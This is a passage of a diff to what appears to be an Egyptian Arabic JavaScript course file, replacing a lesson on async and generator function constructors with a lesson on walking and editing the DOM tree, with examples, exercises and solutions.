-- [[fn instanceof AsyncFunction]] عشان تقرر تستنى: دوال كتير بترجّع Promise ومش async (التمرين).
-- [[fn.constructor.name === 'AsyncFunction']]: نفس المشكلة، وكمان بيتكسر لو حد غيّر [[constructor]].
-- تفتكر [[new Function]] بتشوف متغيراتك: بتشوف الـ global بس.
-- تبني [[new Function('return ' + userInput)]] لـ «حاسبة»: اليوزر يقدر يكتب أي كود.
-- تفتكر [[class]] ليها constructor خاص زي [[ClassFunction]]: مفيش، [[Object.prototype.toString]] بيقول [[[object Function]]].
-- [[new GeneratorFunction('yield +')]]: الـ body بيتعمله parse وقت النداء، فالغلط بيبان [[SyntaxError: Unexpected token '}']] وقتها مش وقت تحميل الملف.`,
+            why: R`كل API في المتصفح متعلّق في واحد من التلاتة دول. لما تعرف مين مسؤول عن إيه، بتعرف تدوّر: مقاس الشاشة مش في [[document]]، ولغة اليوزر مش في [[window]]. وفخاخ الـ global object ([[var name]] وعناصر الـ id) بتعمل باجات بتحيّر لأن مفيش error.`,
+            how: R`المتصفح بيعمل [[Window]] لكل تاب وكل iframe، وجواه [[Document]] واحد للصفحة الحالية. لما تنقل لصفحة تانية الـ [[Document]] بيتغيّر والـ [[Window]] غالبًا بيتغيّر كمان (إلا في الـ bfcache). [[navigator]] واحد لكل [[window]] بس بيوصف المتصفح كله. والأسامي العامة بتتدوّر في السلسلة: الـ scope المحلي، ثم الـ global lexical scope ([[let]] و [[const]] و [[class]])، ثم خصايص [[window]].`,
+            when: R`[[window]] للمقاس والـ scroll والعنوان والأحداث العامة. [[navigator]] لاختيار اللغة وعرض حالة النت وفحص الميزات. [[document]] لأي عنصر. و [[globalThis]] في كود هيشتغل في المتصفح و Node والـ workers.`,
+            mistakes: R`[[var name]] أو [[var status]] برّه function. الاعتماد على عنصر بالـ id كمتغيّر. [[navigator.userAgent.includes(...)]] بدل فحص الميزة. اعتبار [[onLine]] دليل إن السيرفر شغال. [[window.addEventListener("load")]] في سكربت [[defer]] متأخر (ممكن [[load]] يكون حصل خلاص). استخدام [[window]] في كود هيشتغل في Node أو worker.`,
           },
-          teach: R`## الفكرة في سطر
+        },
+        {
+          cmd: "شجرة الـ DOM: parent و children و siblings",
+          title: "كل عنصر ليه أب وأولاد وإخوات: تتمشى في الشجرة وتنقل العناصر وتنسخها",
+          desc: R`الـ DOM شجرة: [[document]] فوق، وتحته [[<html>]] (الـ root)، وكل عقدة (node) ليها أب (parent) واحد، وممكن يبقى ليها أولاد (children) وإخوات (siblings)، وكل اللي تحتها مهما نزل اسمهم descendants. الدرس ده بيمشي في الشجرة بالخصايص بدل [[querySelector]]، وبيوريك ليه [[childNodes]] فيها حاجات انت مكتبتهاش.
+• للعناصر بس: [[parentElement]] و [[children]] و [[firstElementChild]] و [[lastElementChild]] و [[nextElementSibling]] و [[previousElementSibling]] و [[childElementCount]].
+• لكل العقد (نصوص ومسافات وتعليقات): [[parentNode]] و [[childNodes]] و [[firstChild]] و [[nextSibling]].
+• فوق وتحت: [[closest(selector)]] و [[contains(node)]].
+• تبني وتنقل وتمسح: [[createElement]] و [[append]] و [[prepend]] و [[before]] و [[after]] و [[replaceWith]] و [[replaceChildren]] و [[remove]] و [[cloneNode(true)]].`,
+          example: R`const menu = document.querySelector("#menu");
+console.log(menu.childNodes.length, menu.children.length);
+console.log([...menu.childNodes].map(n => n.nodeName).join(" "));
+const hot = menu.querySelector(".hot");
+console.log(hot.previousElementSibling.textContent, hot.nextElementSibling.textContent);
+console.log(hot.parentElement.id, document.documentElement.parentNode.nodeName);
+const b = hot.querySelector("b");
+console.log(b.closest("ul").id, b.closest("table"), menu.contains(b));
+menu.append(menu.firstElementChild);`,
+          try: R`على الصفحة دي: [[<ul id="u">]] وتحتها سطرين [[<li>أ</li>]] و [[<li>ب</li>]] كل واحد في سطر لوحده. قبل ما تشغّل، توقّع: [[u.childNodes.length]] و [[u.children.length]] و [[u.firstChild.nodeName]] و [[u.lastChild.nodeType]].`,
+          sol: R`~~~html tree.html
+<ul id="u">
+  <li>أ</li>
+  <li>ب</li>
+</ul>
+<script>
+const u = document.querySelector("#u");
+console.log(u.childNodes.length, u.children.length, u.firstChild.nodeName, u.firstElementChild.textContent, u.lastChild.nodeType);
+</script>
+~~~
 
-كل نوع دالة ([[async]] و [[function*]] و [[async function*]]) ليه constructor خاص مستخبي، بيحدد الـ prototype والـ tag بتاعه. الناتج من Node 24.22.
+~~~text الناتج (Chrome 157)
+5 2 #text أ 3
+~~~
+
+الـ ٥ = نص (سطر جديد ومسافتين) ثم [[li]] ثم نص ثم [[li]] ثم نص. أول عقدة وآخر عقدة نصوص ([[nodeType]] ٣)، والعناصر ([[nodeType]] ١) اتنين بس.`,
+          teach: R`## الفكرة
+
+المتصفح بيقرا الـ HTML ويبني منه شجرة objects. كل حاجة فيها اسمها **node** (عقدة): العناصر، والنص، وحتى المسافات والسطور الجديدة اللي بين التاجز، والتعليقات. الصفحة اللي هنمشي فيها:
+
+~~~html الصفحة
+<ul id="menu">
+  <li>قهوة</li>
+  <li class="hot">شاي <b>جديد</b></li>
+  <li>كيكة</li>
+</ul>
+~~~
+
+~~~text الشجرة (العناصر بس)
+document
+└─ html                 الـ root element
+   ├─ head
+   └─ body
+      └─ ul#menu        أب الـ 3 li
+         ├─ li           قهوة
+         ├─ li.hot       شاي      ← إخواته: li قبله و li بعده
+         │  └─ b         جديد     ← descendant لـ ul، وابن لـ li.hot
+         └─ li           كيكة
+~~~
+
+| الكلمة | المعنى | مثال |
+|---|---|---|
+| root | أول عنصر، مالوش أب عنصر | [[<html>]] = [[document.documentElement]] |
+| parent | العقدة اللي فوقك على طول | أب [[li.hot]] هو [[ul]] |
+| child | اللي تحتك على طول | أولاد [[ul]] الـ ٣ [[li]] |
+| sibling | ليكم نفس الأب | [[li]] الأولاني والتالت إخوات [[li.hot]] |
+| descendant | تحتك بأي عدد خطوات | [[b]] descendant لـ [[ul]] |
+| ancestor | فوقك بأي عدد خطوات | [[ul]] و [[body]] و [[html]] ancestors لـ [[b]] |
+
+كل النواتج من Chrome 157 على الصفحة دي.
 
 ---
 
-## ١. تجيب الـ constructors التلاتة
+## ١. [[childNodes]] و [[children]]: النص بيتحسب
 
-~~~js
-const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-console.log(AsyncFunction.name, GeneratorFunction.name, AsyncGeneratorFunction.name, Object.getPrototypeOf(AsyncFunction) === Function);
+~~~text الناتج: سطر ٢ و ٣ في المثال
+7 3
+#text LI #text LI #text LI #text
 ~~~
 
-~~~text الناتج
-AsyncFunction GeneratorFunction AsyncGeneratorFunction true
+**[[childNodes]]** = كل العقد (٧): المسافة والسطر الجديد بعد [[<ul>]] نص، وبين كل [[li]] والتاني نص، وقبل [[</ul>]] نص. **[[children]]** = العناصر بس (٣). وده بيتكرر في كل خاصية:
+
+| كل العقد (فيها النص) | العناصر بس | بيرجّع |
+|---|---|---|
+| [[childNodes]] | [[children]] | كل الأولاد (NodeList / HTMLCollection) |
+| [[firstChild]] و [[lastChild]] | [[firstElementChild]] و [[lastElementChild]] | أول وآخر ابن، أو [[null]] |
+| [[nextSibling]] و [[previousSibling]] | [[nextElementSibling]] و [[previousElementSibling]] | الأخ اللي بعد أو قبل، أو [[null]] |
+| [[parentNode]] | [[parentElement]] | الأب (والفرق عند [[<html>]] بس) |
+| [[hasChildNodes()]] | [[childElementCount]] | فيه أولاد؟ / عددهم |
+
+~~~text [[menu.firstChild.textContent]] مقابل [[firstElementChild]]
+"\n  " قهوة
 ~~~
 
-- [[async function () {}]]: function expression فاضية، و [[.constructor]] بيجيب الدالة اللي «عملتها»، وهي [[AsyncFunction]]. (الأقواس مش لازمة هنا لأن الـ [[async function]] بعد [[=]] expression، الدرس الجاي بيشرح ليه.)
-- مفيش طريقة تانية: ولا واحد فيهم global ([[typeof AsyncFunction]] بـ [[undefined]] لو مجبتهوش).
-- [[Object.getPrototypeOf(AsyncFunction) === Function]]: subclass من [[Function]] (زي [[class AsyncFunction extends Function]]).
+نوع العقدة في [[nodeType]]: [[1]] عنصر ([[Node.ELEMENT_NODE]])، و [[3]] نص ([[Node.TEXT_NODE]])، و [[8]] تعليق، و [[9]] الـ document. و [[nodeName]] بيرجّع [["LI"]] (كابيتال في HTML) أو [["#text"]] أو [["#comment"]]. ولاسم التاج صغير استخدم [[localName]] ([["li"]]).
+
+**قاعدة:** في ٩٩٪ من الشغل عايز العناصر، فاستخدم عمود «العناصر بس». الباج الكلاسيكي في تمرين ٣: [[nextSibling.classList]] بيقع لأن الأخ الجاي نص.
 
 ---
 
-## ٢. [[instanceof]] والـ tag
+## ٢. لفوق: [[parentElement]] و [[parentNode]] و [[closest]] و [[contains]]
 
-~~~js
-async function save() {}
-function* ids() {}
-console.log(save instanceof AsyncFunction, ids instanceof GeneratorFunction, ids instanceof AsyncFunction, save instanceof Function);
-const tag = (x) => Object.prototype.toString.call(x);
-console.log(tag(save), tag(ids()), tag((async function* () {})()));
+~~~text الناتج: سطر ٦ و ٨ في المثال
+menu #document
+menu null true
 ~~~
 
-~~~text الناتج
-true true false true
-[object AsyncFunction] [object Generator] [object AsyncGenerator]
-~~~
+**[[parentElement]] و [[parentNode]]** نفس الحاجة تقريبًا دايمًا. الفرق عند القمة: أب [[<html>]] هو [[document]]، والـ document مش عنصر، فـ [[document.documentElement.parentNode]] = [[#document]] لكن [[parentElement]] = [[null]].
 
-| الدالة | constructor | tag الدالة | الناتج لما تناديها | tag الناتج |
-|---|---|---|---|---|
-| [[function f() {}]] | [[Function]] | [[Function]] | أي حاجة | حسب القيمة |
-| [[async function f() {}]] | [[AsyncFunction]] | [[AsyncFunction]] | Promise | [[Promise]] |
-| [[function* f() {}]] | [[GeneratorFunction]] | [[GeneratorFunction]] | generator object | [[Generator]] |
-| [[async function* f() {}]] | [[AsyncGeneratorFunction]] | [[AsyncGeneratorFunction]] | async generator object | [[AsyncGenerator]] |
-| [[class C {}]] | [[Function]] | [[Function]] | لازم [[new]]: instance | حسب الـ class |
+**[[el.closest(selector)]]** بيطلع لفوق (من العنصر نفسه) لحد ما يلاقي أول ancestor بيطابق الـ selector، أو [[null]]. ده اللي بيخلي event delegation تشتغل (درس «event delegation»): ضغطة على [[<b>]] جوه زرار، [[e.target.closest("button")]] يرجّعلك الزرار.
+
+**[[a.contains(b)]]** = [[true]] لو [[b]] هو [[a]] نفسه أو تحته بأي عمق. [[menu.contains(menu)]] = [[true]] (اتجرّبت). الاستخدام المشهور: «اقفل القايمة لو الضغطة برّه» (تمرين ٤).
 
 ---
 
-## ٣. [[Generator]] و [[AsyncGenerator]] جايين منين
+## ٣. تمشي الشجرة كلها
 
-[[GeneratorFunction.prototype.prototype]] **هو** [[Generator.prototype]] (عليه [[next]] و [[return]] و [[throw]])، و [[AsyncGeneratorFunction.prototype.prototype]] هو [[AsyncGenerator.prototype]]. اتجرّب في «جرّب»: [[Object.getPrototypeOf(ids.prototype) === Generator]] بـ [[true]]، و الـ tags [[Generator]] و [[AsyncGenerator]].
+دالة recursive بتمشي على [[children]] وتنزل في كل واحد:
 
-| الـ prototype | عليه |
-|---|---|
-| [[GeneratorFunction.prototype]] | [[prototype]] و [[constructor]] و [[Symbol.toStringTag]]: ده أبو كل generator function |
-| [[GeneratorFunction.prototype.prototype]] = [[Generator]] | [[next]] و [[return]] و [[throw]]: ده أبو كل generator object |
-| [[AsyncFunction.prototype]] | [[constructor]] و [[Symbol.toStringTag]] بس، ومفيش [[prototype]] لأن الـ async functions مش بتعمل objects |
+~~~js count.js
+function countDescendants(el) {
+  let n = 0;
+  for (const child of el.children) n += 1 + countDescendants(child);
+  return n;
+}
+~~~
+
+ولو عايز كل العناصر تحت عنصر من غير recursion: [[el.querySelectorAll("*")]] (اتقاسوا الاتنين في تمرين ٥: نفس الرقم). وفيه أداة جاهزة للحالات الكبيرة: [[document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT)]] و [[nextNode()]]:
+
+~~~text الناتج: TreeWalker على ul#menu
+LI,LI,LI,B,LI,LI
+~~~
+
+(الـ [[LI]] الزيادة دي عناصر اتضافت في القسم الجاي.) الترتيب دايمًا «document order»: الأب، وبعدين أول ابن وكل اللي تحته، وبعدين الابن التاني.
 
 ---
 
-## ٤. تعمل دالة من نص: [[new AsyncFunction]]
+## ٤. تبني وتنقل وتمسح
 
-~~~js
-const add = new AsyncFunction('a', 'b', 'return a + b');
-console.log(add.name, add.length, await add(2, 3));
+~~~text الناتج: كل سطر بعد العملية اللي قبله (اسم كل li)
+append:     قهوة | شاي جديد | كيكة | عصير
+prepend:    مية | قهوة | شاي جديد | كيكة | عصير
+move:       قهوة | شاي جديد | كيكة | عصير | مية
+replaceWith: قهوة | لاتيه | كيكة | مية      (hot.isConnected = false)
+after:      قهوة | لاتيه | شاي جديد | كيكة | مية
 ~~~
+
+| الدالة | بتحط فين | على مين |
+|---|---|---|
+| [[parent.append(...nodes)]] | آخر أولاد [[parent]] | عناصر أو نصوص، كذا واحد مرة واحدة |
+| [[parent.prepend(...)]] | أول أولاد [[parent]] | |
+| [[el.before(...)]] و [[el.after(...)]] | أخ قبل [[el]] أو بعده | |
+| [[el.replaceWith(...)]] | مكان [[el]] نفسه | [[el]] بيطلع من الصفحة |
+| [[parent.replaceChildren(...)]] | يمسح كل الأولاد ويحط الجداد | من غير arguments = فضّي العنصر |
+| [[el.remove()]] | يشيل [[el]] من مكانه | |
+
+**عنصر موجود = نقل مش نسخ.** سطر ٩ في المثال [[menu.append(menu.firstElementChild)]] خد أول [[li]] وحطه في الآخر: العقدة الواحدة متقدرش تبقى في مكانين. نفس الحكاية لو عملت [[append]] لنفس العنصر مرتين: هيبقى مرة واحدة.
+
+**النص بيتحط زي ما هو:** [[latte.before("نص لوحده")]] بيعمل text node (مش HTML)، فـ [[children]] بقت ٤ و [[childNodes]] بقت ٩. ولأن النص مش بيتفسّر كـ HTML، [[append("<b>x</b>")]] بيكتب الحروف نفسها: آمن مع كلام اليوزر.
+
+**الأخطاء:**
+
+~~~text الناتج (Chrome 157)
+TypeError: Failed to execute 'appendChild' on 'Node': parameter 1 is not of type 'Node'.
+HierarchyRequestError: Failed to execute 'append' on 'Element': The new child element contains the parent.
+~~~
+
+الأولى: [[appendChild]] القديمة بتقبل node بس (عكس [[append]] اللي بتقبل نصوص). التانية: حاولت تحط [[ul]] جوه [[li]] هي أصلًا جواها، والشجرة متبقاش دايرة.
+
+**[[children]] حية و [[querySelectorAll]] صورة:** خدت الاتنين قبل [[remove()]]:
 
 ~~~text الناتج
-anonymous 2 5
+live vs static: 4 5
 ~~~
 
-- آخر argument هو الـ body، واللي قبله أسامي الـ parameters كنصوص.
-- الاسم [[anonymous]] دايمًا، و [[length]] 2 من الـ parameters.
-- [[add(2, 3)]] بترجّع Promise ([[AsyncFunction]])، فاستنيناها: 5. وتقدر تكتب [[await]] جوه الـ body: [[new AsyncFunction('ms', 'await new Promise(r => setTimeout(r, ms)); return "waited " + ms;')]] رجّعت [['waited 5']].
-
-### بتشوف إيه
-
-~~~js
-const secret = 'local';
-console.log(new Function('return typeof secret')());
-~~~
-
-~~~text الناتج
-undefined
-~~~
-
-الدالة اتبنت في الـ **global scope**: [[secret]] قدامها بسطر ومش شايفاه. ولما عملت [[globalThis.g = 'global']] شافت [[g]]. يعني زي [[eval]] غير المباشر بالظبط، ومعاه نفس المنع: [[--disallow-code-generation-from-strings]] أو CSP من غير [[unsafe-eval]] بيرموا [[EvalError: Code generation from strings disallowed for this context]] (التمرين الأخير).
+[[menu.children]] (HTMLCollection) اتحدثت لوحدها، و [[querySelectorAll]] (NodeList) فضلت زي ما خدتها. ولو بتمسح عناصر وانت بتلف على [[children]]، هتنط عناصر: لف على [[[...menu.children]]] (نسخة). وكمان [[children.forEach]] مش موجودة ([[undefined]])، و [[childNodes.forEach]] و [[querySelectorAll(...).forEach]] موجودين.
 
 ---
 
-## ٥. الفخ: «async» مش نوع، دي نتيجة
-
-~~~js
-const notAsync = () => Promise.resolve(1);
-console.log(notAsync instanceof AsyncFunction, notAsync() instanceof Promise);
-~~~
+## ٥. [[cloneNode]]: نسخة
 
 ~~~text الناتج
-false true
+shallow: <li class="hot"></li>
+deep: <li class="hot">شاي <b>جديد</b></li>
 ~~~
 
-دالة عادية بترجّع Promise. أي كود بيقرر «أستنى ولا لأ» من نوع الدالة هيغلط معاها (ومع الكود اللي اتعمله transpile). الحل: [[await fn()]] دايمًا.
+- **[[cloneNode()]]** = العنصر بالـ attributes بس من غير أولاد. **[[cloneNode(true)]]** = العنصر وكل اللي تحته.
+- **الـ [[id]] بيتنسخ:** النسخة ليها نفس الـ id، فغيّره أو شيله قبل ما تحطها في الصفحة.
+- **الـ listeners مش بتتنسخ:** زرار عليه [[addEventListener("click")]]، نسخته بتتداس ومفيش حاجة بتحصل (اتقاس في تمرين ٥ في الدرس ده). الـ [[onclick="..."]] المكتوب كـ attribute بيتنسخ لأنه attribute.
+- **الاستخدام الأشهر:** [[<template>]] فيها شكل كارت، و [[tpl.content.firstElementChild.cloneNode(true)]] لكل عنصر في الداتا، وبعدين تملا النصوص بـ [[textContent]]. ده اللي مشروع الملاحظات الكبير في الوحدة دي بيعمله.
+- **جديد ومش في كل المتصفحات:** [[parent.moveBefore(node, ref)]] بتنقل عنصر من غير ما تبوّظ حالته (فيديو شغال، focus، animation). موجودة في Chrome 157 ولسه «Limited availability» في MDN.
 
 ---
 
 ## الخلاصة
 
-- [[AsyncFunction]] و [[GeneratorFunction]] و [[AsyncGeneratorFunction]]: subclasses من [[Function]] مش global، بتتجاب من [[.constructor]].
-- [[GeneratorFunction.prototype.prototype]] = [[Generator]]، و [[AsyncGeneratorFunction.prototype.prototype]] = [[AsyncGenerator]].
-- بناء دالة من نص = [[eval]]: global scope بس، وممنوع بالـ CSP، ومش لنص من يوزر.
-- متقررش تستنى من نوع الدالة: [[await]] النتيجة.`,
+| عايز | استخدم |
+|---|---|
+| الأب | [[parentElement]] |
+| الأولاد / أول وآخر واحد | [[children]] و [[firstElementChild]] و [[lastElementChild]] |
+| الأخ اللي بعدي / قبلي | [[nextElementSibling]] و [[previousElementSibling]] |
+| أقرب ancestor بشكل معين | [[closest(selector)]] |
+| هل ده جوه ده؟ | [[contains(node)]] |
+| أضيف / أنقل | [[append]] و [[prepend]] و [[before]] و [[after]] |
+| أبدّل / أفضّي / أمسح | [[replaceWith]] و [[replaceChildren()]] و [[remove()]] |
+| نسخة | [[cloneNode(true)]] (والـ listeners لأ) |
+
+اللي ميتلخبطش: المسافات في الـ HTML عقد نص، فاستخدم الخصايص اللي فيها «Element». والعنصر الموجود لما تعمله [[append]] بيتنقل مش بيتنسخ.`,
           lines: [
-            R`function expression فاضية من نوع async، و [[.constructor]] بيجيب الـ constructor اللي عاملها: [[AsyncFunction]].`,
-            R`نفس الفكرة على generator function: [[GeneratorFunction]].`,
-            R`وعلى async generator function: [[AsyncGeneratorFunction]].`,
-            R`الأسامي التلاتة، و [[true]]: الـ prototype بتاع [[AsyncFunction]] هو [[Function]] نفسها، يعني subclass.`,
-            R`دالة async عادية بالـ declaration.`,
-            R`generator function بالـ declaration.`,
-            R`[[true]] و [[true]] و [[false]] (generator مش async) و [[true]] (كلهم [[Function]] في الآخر).`,
-            R`دالة بتطبع الـ tag بـ [[Object.prototype.toString]] الأصلية.`,
-            R`الدالة [[AsyncFunction]]، والـ objects الناتجة [[Generator]] و [[AsyncGenerator]].`,
-            R`دالة async من نص: parameters [[a]] و [[b]] والـ body في الآخر.`,
-            R`اسمها [[anonymous]]، و [[length]] 2، والنتيجة Promise استنيناها: 5.`,
-            R`دالة عادية (مش async) بترجّع Promise.`,
-            R`[[false]]: مش [[AsyncFunction]]، مع إن نتيجتها Promise ([[true]]).`,
-            R`متغير محلي في الـ module، عشان نشوف الدالة اللي من نص بتشوفه ولا لأ.`,
-            R`[[undefined]]: [[new Function]] اتبنت في الـ global scope ومش شايفة [[secret]].`,
+            R`بنجيب الـ [[ul]] اللي هنمشي فيها`,
+            R`[[childNodes]] = ٧ (فيها نصوص المسافات)، و [[children]] = ٣ عناصر بس`,
+            R`أسامي الـ ٧ عقد: [[#text]] بين كل [[LI]] والتاني، لأن السطر الجديد والمسافات نص`,
+            R`بنجيب [[li.hot]] اللي في نص اللستة بـ [[querySelector]] جوه الـ [[menu]]، عشان نمشي منه للإخوات`,
+            R`الأخ اللي قبله «قهوة» واللي بعده «كيكة»، من غير ما نعدّي على النص`,
+            R`أبوه [[ul#menu]]، وأبو [[<html>]] هو الـ document نفسه ([[#document]])`,
+            R`بنجيب عنصر [[b]] اللي جوه [[li.hot]]، وهو حفيد الـ [[ul]] (descendant)`,
+            R`[[closest]] طلع لفوق ولقى [[ul#menu]]، وملقاش [[table]] فرجّع [[null]]، و [[contains]] = [[true]]`,
+            R`أول [[li]] اتنقل لآخر اللستة: العقدة الموجودة بتتنقل مش بتتنسخ`,
+          ],
+          practice: [
+            { lvl: 'تطبيق', t: R`**ابني:** لستة دور فيها ٣ أسامي، وجنب كل اسم زرارين ▲ و ▼ بيطلّعوه أو ينزّلوه مكان واحد، وسطر تحت بيكتب الترتيب «الدور: سارة ثم عمر ثم منى». listener واحد على اللستة، والنقل بـ [[previousElementSibling]] و [[before]] و [[nextElementSibling]] و [[after]] (من قسم ٤ في الشرح).`, done: R`▲ على الأخير بيطلعه فوق اللي قبله، و ▲ على الأول ومش بيحصل حاجة ومفيش error، و ▼ على الأخير نفس الكلام، والسطر بيتحدث مع كل ضغطة.`, sol: R`~~~live 230 لستة الدور
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
+  #queue { padding: 0; list-style: none; display: grid; gap: 6px; max-width: 320px; }
+  #queue li { display: flex; justify-content: space-between; align-items: center; background: #f3f4f6; padding: 4px 10px; border-radius: 6px; }
+  button { font: inherit; padding: 0 8px; }
+</style>
+<ol id="queue">
+  <li><span>سارة</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
+  <li><span>عمر</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
+  <li><span>منى</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
+</ol>
+<p id="order"></p>
+<script>
+const queue = document.querySelector("#queue");
+const order = () => {
+  document.querySelector("#order").textContent = "الدور: " + [...queue.children].map(li => li.firstElementChild.textContent).join(" ثم ");
+};
+queue.addEventListener("click", e => {
+  const btn = e.target.closest("button[data-move]");
+  if (!btn) return;
+  const li = btn.closest("li");
+  if (btn.dataset.move === "up") li.previousElementSibling?.before(li);
+  else li.nextElementSibling?.after(li);
+  btn.focus();
+  order();
+});
+order();
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، Playwright داس الزراير بالترتيب ده)
+البداية:          الدور: سارة ثم عمر ثم منى
+▲ على منى:        الدور: سارة ثم منى ثم عمر
+▲ على الأولى:     الدور: سارة ثم منى ثم عمر   (مفيش أخ قبلها، مفيش حاجة حصلت)
+▼ على الأخير:     الدور: سارة ثم منى ثم عمر
+~~~
+
+- **[[li.previousElementSibling?.before(li)]]:** «حط نفسك قبل أخوك اللي قبلك». والـ [[?.]] بيوقف لو مفيش أخ (أول عنصر)، فمفيش [[TypeError]].
+- **مش محتاجين نمسح ونعمل عنصر جديد:** [[before]] على عنصر موجود بينقله، والـ listeners اللي جواه زي ما هي.
+- **[[btn.focus()]]:** بعد النقل الـ focus بيفضل على الزرار، فاللي بيستخدم الكيبورد يقدر يدوس Enter تاني ويكمّل نقل.
+- **[[li.firstElementChild]]** هو الـ [[span]] اللي فيه الاسم. لو استخدمت [[firstChild]] وكان فيه مسافة قبل الـ span في الـ HTML هتاخد نص فاضي.` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[const next = document.querySelector("#u li").nextSibling; next.classList.add("hl");]] على الـ [[ul#u]] اللي في «جرّب». إيه الخطأ بالنص؟ وجرّب نفس السطر على [[<ol><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>]] (كله في سطر واحد) من [[.now]]: ليه اشتغل هناك؟ (من قسم ١ في الشرح).`, done: R`شفت [[TypeError]] في الأولى، والتانية اشتغلت لأن مفيش مسافات بين التاجز، والإصلاح [[nextElementSibling]] اشتغل في الاتنين.`, sol: R`~~~html fix-sibling.html
+<ul id="u">
+  <li>أ</li>
+  <li>ب</li>
+</ul>
+<ol id="steps"><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>
+<script>
+const first = document.querySelector("#u li");
+try { first.nextSibling.classList.add("hl"); } catch (e) { console.log("بايظ:", e.name + ": " + e.message); }
+document.querySelector(".now").nextSibling.classList.add("hl");
+first.nextElementSibling.classList.add("hl");
+console.log("صح:", first.nextElementSibling.className, document.querySelector(".now").nextElementSibling.textContent);
+</script>
+~~~
+
+~~~text الناتج (Chrome 157)
+بايظ: TypeError: Cannot read properties of undefined (reading 'add')
+صح: hl قلّب
+~~~
+
+- **[[nextSibling]]** لأول [[li]] في [[#u]] هو text node (السطر الجديد والمسافتين). الـ text node مالوش [[classList]]، فـ [[classList]] = [[undefined]] و [[.add]] وقعت.
+- **في الـ [[ol]]** التاجز لازقة في بعض، فـ [[nextSibling]] طلع عنصر بالصدفة. ده أسوأ نوع باج: الكود يشتغل لحد ما حد يعمل format للـ HTML (Prettier مثلًا) فيقع.
+- **الإصلاح:** [[nextElementSibling]] بيتخطى النص والتعليقات دايمًا. ولو مش متأكد إن فيه أخ: [[next?.classList.add("hl")]].` },
+            { lvl: 'تطبيق', t: R`**ابني:** قايمة «الحساب ▾» بتفتح بزرار، وبتتقفل لو دست في أي حتة برّه القايمة (بـ [[contains]])، أو دست Esc (والـ focus يرجع للزرار)، ومبتتقفلش لو دست جوه. وحدّث [[aria-expanded]] (من قسم ٢ في الشرح).`, done: R`ضغطة جوه القايمة مبتقفلهاش، وضغطة على أي حتة في الصفحة بتقفلها، و Esc بيقفلها والـ focus على الزرار، و [[aria-expanded]] بيتغيّر [[true]] و [[false]].`, sol: R`~~~live 230 قايمة بتتقفل من برّه
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 200px; }
+  .dropdown { position: relative; display: inline-block; }
+  .dropdown ul { position: absolute; inset-inline-start: 0; margin: 4px 0 0; padding: 6px; list-style: none; background: #fff; border: 1px solid #ccc; border-radius: 6px; min-width: 140px; }
+  button { font: inherit; }
+</style>
+<div class="dropdown" id="dd">
+  <button type="button" id="toggle" aria-expanded="false">الحساب ▾</button>
+  <ul id="menu" hidden>
+    <li><a href="#">بياناتي</a></li>
+    <li><a href="#">طلباتي</a></li>
+    <li><button type="button">خروج</button></li>
+  </ul>
+</div>
+<p id="log">دوس على الزرار، وبعدين دوس في أي حتة برّه.</p>
+<script>
+const dd = document.querySelector("#dd");
+const menu = document.querySelector("#menu");
+const toggle = document.querySelector("#toggle");
+function setOpen(open) {
+  menu.hidden = !open;
+  toggle.setAttribute("aria-expanded", String(open));
+}
+toggle.addEventListener("click", () => setOpen(menu.hidden));
+document.addEventListener("click", e => {
+  if (!dd.contains(e.target)) {
+    if (!menu.hidden) document.querySelector("#log").textContent = "اتقفلت: الضغطة كانت على " + e.target.localName + " برّه القايمة";
+    setOpen(false);
+  }
+});
+document.addEventListener("keydown", e => {
+  if (e.key === "Escape" && !menu.hidden) { setOpen(false); toggle.focus(); }
+});
+</script>
+~~~
+
+~~~text الناتج (Chrome 157، Playwright)
+فتح:            ظاهرة true، aria-expanded = true
+ضغطة جوه:       ظاهرة true
+ضغطة على الـ p:  ظاهرة false | اتقفلت: الضغطة كانت على p برّه القايمة
+Esc:            ظاهرة false، الـ focus على toggle
+~~~
+
+- **[[dd.contains(e.target)]]** على الـ div اللي فيه الزرار والقايمة الاتنين. لو عملتها على [[menu]] بس، الضغطة على الزرار نفسه هتتحسب «برّه» فتقفل القايمة في نفس اللحظة اللي بتفتح فيها (الـ listener بتاع [[document]] بيشتغل بعد بتاع الزرار بسبب الـ bubbling).
+- **[[hidden]]** بيخفي العنصر ومبيخليهوش يتداس ولا يوصله Tab.
+- **Esc والـ focus:** اللي بيستخدم الكيبورد لازم يرجع مكان ما كان.` },
+            { lvl: 'تحدي', t: R`**مسألة:** اكتب [[cssPath(el)]] بتطلع من العنصر لفوق بـ [[parentElement]] وترجّع selector يوصله: لو للعنصر [[id]] وقّف عنده ([[nav#site]])، ولو ليه إخوات من نفس النوع حط [[:nth-child(n)]]. واكتب [[countDescendants(el)]] recursive وقارنها بـ [[querySelectorAll("*").length]]. اتأكد إن [[document.querySelector(cssPath(x)) === x]] (من قسمي ٢ و ٣ في الشرح).`, done: R`تاني [[li]] في [[nav#site]] بيطلع [[nav#site > ul > li:nth-child(2)]]، والـ [[querySelector]] بيرجّع نفس العنصر، والعدّين متساويين.`, sol: R`~~~html css-path.html
+<nav id="site"><ul><li><a href="#">الرئيسية</a></li><li><a href="#" id="menu-link">المنيو</a></li></ul></nav>
+<ol id="steps"><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>
+<script>
+function cssPath(el) {
+  const parts = [];
+  for (let node = el; node && node !== document.documentElement; node = node.parentElement) {
+    const parent = node.parentElement;
+    const index = [...parent.children].indexOf(node) + 1;
+    const same = [...parent.children].filter(c => c.localName === node.localName).length;
+    parts.unshift(node.id ? node.localName + "#" + node.id : same > 1 ? node.localName + ":nth-child(" + index + ")" : node.localName);
+    if (node.id) break;
+  }
+  return parts.join(" > ");
+}
+function countDescendants(el) {
+  let n = 0;
+  for (const child of el.children) n += 1 + countDescendants(child);
